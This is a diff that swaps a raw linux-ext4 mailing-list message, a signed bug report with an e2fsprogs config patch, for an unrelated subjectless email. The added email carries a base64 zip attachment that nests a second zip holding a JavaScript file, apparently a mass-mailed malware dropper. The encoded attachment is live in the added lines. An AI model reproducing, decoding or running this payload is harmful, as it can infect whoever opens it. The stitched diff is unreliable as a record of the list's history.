@@ -1,111 +1,107 @@
-From: Felipe A Rodriguez <far@illumenos.com>
-Subject: Possible regression in e2fsprogs-1.43.4
-Date: Sat, 10 Jun 2017 16:00:20 +0200
-Message-ID: <B2DFC17F-1CFC-410E-9449-2393D51C700B@illumenos.com>
-Mime-Version: 1.0 (Mac OS X Mail 7.3 \(1878.6\))
-Content-Type: multipart/signed; boundary="Apple-Mail=_13492744-C856-4DD7-B57C-8D1431142C86"; protocol="application/pkcs7-signature"; micalg=sha1
-To: linux-ext4@vger.kernel.org
+From: <board@gowoodlawn.com>
+Subject: (unknown)
+Date: Sat, 10 Jun 2017 20:24:49 -0000
+Message-ID: <149712628996.19456.8044461114175531380@hinet.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="549426.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail.illumenos.com ([46.101.240.157]:58127 "EHLO
-        mail.illumenos.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752100AbdFJOIE (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>); Sat, 10 Jun 2017 10:08:04 -0400
-Received: from [192.168.1.33] (217-162-97-158.dynamic.hispeed.ch [217.162.97.158]);
-        by mail.illumenos.com (OpenSMTPD) with ESMTPSA id 3ebc51ca;
-        TLS version=TLSv1/SSLv3 cipher=ECDHE-RSA-AES256-SHA bits=256 verify=NO;
-        for <linux-ext4@vger.kernel.org>;
-        Sat, 10 Jun 2017 14:01:22 +0000 (UTC)
+Received: from 1-173-41-236.dynamic-ip.hinet.net ([1.173.41.236]:42790 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751573AbdFJUYz (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Sat, 10 Jun 2017 16:24:55 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-
---Apple-Mail=_13492744-C856-4DD7-B57C-8D1431142C86
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-	charset=us-ascii
-
-Upgrading from e2fsprogs-1.42.13 to e2fsprogs-1.43.4 causes the boot =
-loader to fail (unknown filesystem error) on the x86_64 VM I use for =
-initial testing.  I traced the problem to changes in the e2fsprogs =
-configuration file which now sets 64 bit flags.  I tried upgrading to =
-GRUB 2.02 but that did not resolve the problem.  Reverting the changes =
-per the patch below fixes the problem. =20
-
-
-Kernel: 3.16.42, x86_64
-Bootloader:  GRUB 2.00
-Filesystem:  Ext4
-
-
-
-diff -ruN e2fsprogs-1.43.4/misc/mke2fs.conf.in =
-e2fsprogs-1.43.4-patched/misc/mke2fs.conf.in
---- e2fsprogs-1.43.4/misc/mke2fs.conf.in	Wed Feb  1 01:56:32 2017
-+++ e2fsprogs-1.43.4-patched/misc/mke2fs.conf.in	Sat Jun  3 =
-23:21:39 2017
-@@ -11,11 +11,12 @@
- 		features =3D has_journal
- 	}
- 	ext4 =3D {
--		features =3D =
-has_journal,extent,huge_file,flex_bg,uninit_bg,64bit,dir_nlink,extra_isize=
-
-+		features =3D =
-has_journal,extent,huge_file,flex_bg,uninit_bg,dir_nlink,extra_isize
-+		auto_64-bit_support =3D 1
- 		inode_size =3D 256
- 	}
- 	ext4dev =3D {
--		features =3D =
-has_journal,extent,huge_file,flex_bg,uninit_bg,inline_data,64bit,dir_nlink=
-,extra_isize
-+		features =3D =
-has_journal,extent,huge_file,flex_bg,uninit_bg,dir_nlink,extra_isize
- 		inode_size =3D 256
- 		options =3D test_fs=3D1
- 	}
-
-
-
-Regards,
-
-Felipe A. Rodriguez
-
-
-illumenos LLC
-________________________
-
-
-
-
-
-
---Apple-Mail=_13492744-C856-4DD7-B57C-8D1431142C86
-Content-Disposition: attachment;
-	filename=smime.p7s
-Content-Type: application/pkcs7-signature;
-	name=smime.p7s
-Content-Transfer-Encoding: base64
-
-MIAGCSqGSIb3DQEHAqCAMIACAQExCzAJBgUrDgMCGgUAMIAGCSqGSIb3DQEHAQAAoIICfzCCAnsw
-ggHkoAMCAQICCqanDr1kz71qujMwDQYJKoZIhvcNAQEFBQAwbjEZMBcGA1UEAxMQRmVsaXBlIFJv
-ZHJpZ3VlejETMBEGA1UEChMKRkJBUiBmaWxlcjENMAsGA1UECxMERkJBUjEgMB4GCSqGSIb3DQEJ
-ARYRZmFyQGlsbHVtZW5vcy5jb20xCzAJBgNVBAYTAlVTMB4XDTE0MDIyMjIxMDcyNFoXDTE5MDIy
-MjIxMDcyNFowbjEZMBcGA1UEAxMQRmVsaXBlIFJvZHJpZ3VlejETMBEGA1UEChMKRkJBUiBmaWxl
-cjENMAsGA1UECxMERkJBUjEgMB4GCSqGSIb3DQEJARYRZmFyQGlsbHVtZW5vcy5jb20xCzAJBgNV
-BAYTAlVTMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDgPLXDCrdOkVKK2699h0EDXjw1+eRJ
-Q8q7sMKF8DgriyscXRCCDMwn+FlE32VZFMwBorYHxG7Y5rHV92Rw1Vo5/miyOm9yBC0SJ0AZL5CL
-sl10walw2x14YtLJx23QyMLrjIfN5SNYYNMer53Cx5G5bsfhXtxT4RTDH0TfgoEQAQIDAQABoyAw
-HjAPBgkqhkiG9y8BAQoEAgUAMAsGA1UdDwQEAwIDmDANBgkqhkiG9w0BAQUFAAOBgQA2J7u2FSZr
-jgKJk8moqKjQHW8OiD0lR5nSCAK1KPWiHX2Lqp4Rf7tBGnHXkW6PqC2bNcSJelmJnl3cHHb65A8x
-GWBx1euk1GPiX1wWYXufnMzVdE+yIb1CB+spbEZEFivwqwacxC3wh7CRC3Ar8EHO6f2SMKNzzGFI
-RlRdlDzpcjGCAYEwggF9AgEBMHwwbjEZMBcGA1UEAxMQRmVsaXBlIFJvZHJpZ3VlejETMBEGA1UE
-ChMKRkJBUiBmaWxlcjENMAsGA1UECxMERkJBUjEgMB4GCSqGSIb3DQEJARYRZmFyQGlsbHVtZW5v
-cy5jb20xCzAJBgNVBAYTAlVTAgqmpw69ZM+9arozMAkGBSsOAwIaBQCgXTAYBgkqhkiG9w0BCQMx
-CwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0xNzA2MTAxNDAwMjFaMCMGCSqGSIb3DQEJBDEW
-BBQMY//jWyDUes+uHXrXaLbMyjVR7jANBgkqhkiG9w0BAQEFAASBgNko73WtKErYiz5MTUnIwi2h
-6QfydLPJBC2BEyERevXOVI9vsfgmZRE8CP6b2cDYIK8Fs8NtpJUztCrjHtoGfYLQik2lPGdlSXoc
-zWUqefbXGsip1Cr719C2hZe9yCx2Ywpp9RFJjSkCoMIt8drH5Vs3OK3XnPUSirt0jj7R98cuAAAA
-AAAA
-
---Apple-Mail=_13492744-C856-4DD7-B57C-8D1431142C86--
+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
+AAEAAQBbAAAANhMAAAAA
